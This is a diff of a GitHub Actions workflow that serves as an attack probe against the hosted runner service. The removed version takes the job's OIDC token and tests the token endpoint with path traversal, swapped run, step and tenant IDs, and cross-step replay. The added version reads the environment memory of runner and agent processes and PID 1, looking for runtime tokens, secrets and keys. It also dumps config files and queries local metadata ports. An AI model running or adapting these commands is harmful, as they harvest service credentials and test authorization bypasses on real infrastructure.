@@ -1,4 +1,4 @@
-name: OIDCProbe
+name: HCAProbe
 on:
   push:
     branches: [main]
@@ -9,50 +9,58 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Capture URL in step 1
-        id: step1
+      - name: HCA and internal token investigation
         run: |
-          echo "STEP1_URL=$ACTIONS_ID_TOKEN_REQUEST_URL" >> $GITHUB_ENV
-          echo "STEP1_TOKEN=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> $GITHUB_ENV
-          echo STEP1_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
-          echo ORCHESTRATION_ID=$ACTIONS_ORCHESTRATION_ID
-      - name: Path traversal and BOLA probe
-        run: |
-          BURL=$(echo $STEP1_URL | sed 's/?api-version.*//')
-          echo BURL=$BURL
-          echo ''
-          echo '--- ORIGINAL ---'
-          O=$(curl -sf -H "Authorization: bearer $STEP1_TOKEN" "${BURL}?api-version=2.0&audience=api.github.com")
-          echo $O | python3 -c "import json,sys; t=json.load(sys.stdin).get('value','ERR'); p=t.split('.')[1]; import base64; b=p+'='*(-len(p)%4); c=json.loads(base64.b64decode(b)); print('sub:', c.get('sub')); print('jti:', c.get('jti')); print('ref:', c.get('ref'))" 2>/dev/null
-          echo ''
-          echo '--- TRAVERSAL: idtoken/../idtoken ---'
-          TURL=$(echo $BURL | sed 's|/idtoken/|/idtoken/../idtoken/|')
-          echo TURL=$TURL
-          TB=$(curl -s -H "Authorization: bearer $STEP1_TOKEN" "${TURL}?api-version=2.0&audience=api.github.com")
-          echo TRAV_RESPONSE=$(echo $TB | head -c 500)
-          echo TRAV_HAS_VALUE=$(echo $TB | python3 -c "import json,sys; print('YES' if 'value' in json.load(sys.stdin) else 'NO')" 2>/dev/null || echo PARSE_ERR)
-          echo ''
-          echo '--- DIFFERENT RUN GUID (all zeros) ---'
-          RG=$(echo $BURL | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1)
-          ZURL=$(echo $BURL | sed "s|$RG|00000000-0000-0000-0000-000000000001|")
-          Z=$(curl -s -w '\nHTTP_STATUS:%{http_code}' -H "Authorization: bearer $STEP1_TOKEN" "${ZURL}?api-version=2.0&audience=api.github.com")
-          echo ZERO_RUN_GUID_RESPONSE=$Z
-          echo ''
-          echo '--- DIFFERENT STEP GUID (all zeros) ---'
-          SG=$(echo $BURL | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | tail -1)
-          SURL=$(echo $BURL | sed "s|$SG|00000000-0000-0000-0000-000000000002|")
-          S=$(curl -s -w '\nHTTP_STATUS:%{http_code}' -H "Authorization: bearer $STEP1_TOKEN" "${SURL}?api-version=2.0&audience=api.github.com")
-          echo ZERO_STEP_GUID_RESPONSE=$S
-          echo ''
-          echo '--- TENANT 0 instead of 140 ---'
-          CURR_TENANT=$(echo $BURL | grep -oP '(?<=\.com/)\d+')
-          T0URL=$(echo $BURL | sed "s|/$CURR_TENANT/|/0/|")
-          T0=$(curl -s -w '\nHTTP_STATUS:%{http_code}' -H "Authorization: bearer $STEP1_TOKEN" "${T0URL}?api-version=2.0&audience=api.github.com")
-          echo TENANT0_RESPONSE=$T0
-          echo ''
-          echo '--- STEP1 URL IN STEP2 (cross-step replay) ---'
-          echo STEP1_URL_VALUE=$STEP1_URL
-          echo CURRENT_URL=$ACTIONS_ID_TOKEN_REQUEST_URL
-          echo URLS_SAME=$(test "$STEP1_URL" = "$ACTIONS_ID_TOKEN_REQUEST_URL" && echo YES || echo NO)
-          CS=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${STEP1_URL}&audience=api.github.com")
-          echo CROSS_STEP_JTI=$(echo $CS | python3 -c "import json,sys; t=json.load(sys.stdin).get('value',''); p=t.split('.')[1]; import base64; b=p+'='*(-len(p)%4); c=json.loads(base64.b64decode(b)); print(c.get('jti','ERR'))" 2>/dev/null)
+          echo '=== CURRENT USER ==='
+          id
+          echo '=== ALL PROCESSES (runner user) ==='
+          ps aux | grep -v grep | grep runner | head -20
+          echo '=== HCA PROCESS DETAILS ==='
+          HCA_PID=$(pgrep -f hosted-compute-agent | head -1)
+          echo HCA_PID=$HCA_PID
+          if [ -n "$HCA_PID" ]; then
+            echo '--- HCA cmdline ---'
+            cat /proc/$HCA_PID/cmdline 2>/dev/null | tr '\0' ' '
+            echo ''
+            echo '--- HCA environ (CRITICAL - looking for ACTIONS_RUNTIME_TOKEN) ---'
+            cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|RUNTIME|CACHE|AUTH|BEARER|ACTIONS' | head -30 || echo 'HCA_ENVIRON_READ_FAILED'
+            echo '--- HCA ALL environ ---'
+            cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | head -50 || echo 'FAILED'
+          fi
+          echo '=== RUNNER.LISTENER PID ==='
+          RL_PID=$(pgrep -f Runner.Listener | head -1)
+          echo RL_PID=$RL_PID
+          if [ -n "$RL_PID" ]; then
+            echo '--- Listener environ ---'
+            cat /proc/$RL_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|RUNTIME|CACHE' | head -20 || echo 'LISTENER_ENVIRON_FAILED'
+          fi
+          echo '=== ALL RUNNER PROCS ENVIRON ==='
+          for pid in $(pgrep -u runner 2>/dev/null); do
+            CMD=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 50)
+            ENV_HITS=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'ACTIONS_RUNTIME_TOKEN|ACTIONS_CACHE_URL|_apis/artifactcache' | head -5)
+            if [ -n "$ENV_HITS" ]; then
+              echo FOUND IN PID $pid CMD=$CMD:
+              echo $ENV_HITS
+            fi
+          done
+          echo '=== OPT HCA DIRECTORY ==='
+          ls -laR /opt/hca/ 2>/dev/null | head -30
+          echo '=== UNIX SOCKETS HCA ==='
+          ss -xlp 2>/dev/null | grep -iE 'hca|runner|action' | head -10 || echo 'no sockets found'
+          echo '=== LOCALHOST PORTS ==='
+          ss -tlnp 2>/dev/null | head -20
+          echo '=== RUNTIME TOKEN VIA HCA SOCKET ==='
+          find /run /tmp /var/run -name '*.sock' 2>/dev/null | head -20
+          echo '=== PID 1 ENVIRON ==='
+          cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|RUNTIME|CACHE' | head -20 || echo 'PID1_ENVIRON_FAILED'
+          echo '=== HCA CONFIG FILES ==='
+          find /opt/hca /etc/hca /home/runner/.hca -type f 2>/dev/null | head -20
+          cat /opt/hca/*.json 2>/dev/null || echo 'no json'
+          cat /opt/hca/*.conf 2>/dev/null || echo 'no conf'
+          echo '=== RUNNER ACTIONS-RUNNER DIR ==='
+          ls -la /home/runner/actions-runner/ 2>/dev/null | head -20
+          find /home/runner/actions-runner -name '*.json' -not -path '*/cached/*' 2>/dev/null | xargs cat 2>/dev/null | head -50
+          echo '=== RUNTIME TOKEN VIA CURL HCA METADATA ==='
+          curl -s http://localhost:8080/api/v1/metadata 2>/dev/null | head -5 || echo 'no 8080'
+          curl -s http://localhost:9090/api/v1/metadata 2>/dev/null | head -5 || echo 'no 9090'
+          curl -s http://localhost:2222/metadata 2>/dev/null | head -5 || echo 'no 2222'
